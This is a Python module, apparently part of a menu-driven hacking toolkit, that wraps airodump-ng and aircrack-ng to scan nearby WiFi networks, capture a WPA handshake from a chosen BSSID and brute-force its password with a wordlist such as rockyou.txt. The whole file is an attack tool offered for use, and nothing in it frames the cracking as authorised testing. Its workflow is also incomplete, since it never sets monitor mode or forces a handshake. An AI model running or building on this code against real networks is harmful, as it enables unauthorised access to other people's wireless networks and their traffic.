import subprocess
import os
from time import sleep

def scan_wifi(interface="wlan0"):
    """Scan for nearby WiFi networks using airodump-ng."""
    try:
        print(f"\n[+] Scanning WiFi networks on {interface}...")
        subprocess.run(["airodump-ng", interface])
    except FileNotFoundError:
        print("[-] Install aircrack-ng: sudo apt install aircrack-ng")

def crack_wpa(interface, bssid, wordlist):
    """Crack WPA/WPA2 using aircrack-ng."""
    try:
        print(f"\n[+] Cracking {bssid} with {wordlist}...")
        # Step 1: Capture handshake
        subprocess.run(["airodump-ng", "-c", "6", "--bssid", bssid, "-w", "capture", interface])
        # Step 2: Run aircrack
        subprocess.run(["aircrack-ng", "-w", wordlist, "capture-01.cap"])
    except Exception as e:
        print(f"[-] Error: {e}")

def wifi_cracking_menu():
    """WiFi cracking submenu."""
    while True:
        print("\n=== WiFi Cracking ===")
        print("1) Scan Networks (airodump-ng)")
        print("2) Crack WPA/WPA2 (aircrack-ng)")
        print("3) Back to Wireless Menu")
        choice = input("Select an option: ")

        if choice == "1":
            interface = input("Enter interface (default: wlan0): ") or "wlan0"
            scan_wifi(interface)
        elif choice == "2":
            interface = input("Enter interface (default: wlan0): ") or "wlan0"
            bssid = input("Enter target BSSID (e.g., AA:BB:CC:DD:EE:FF): ")
            wordlist = input("Enter wordlist path (e.g., /usr/share/wordlists/rockyou.txt): ")
            crack_wpa(interface, bssid, wordlist)
        elif choice == "3":
            break
        else:
            print("[-] Invalid option.")
        sleep(1)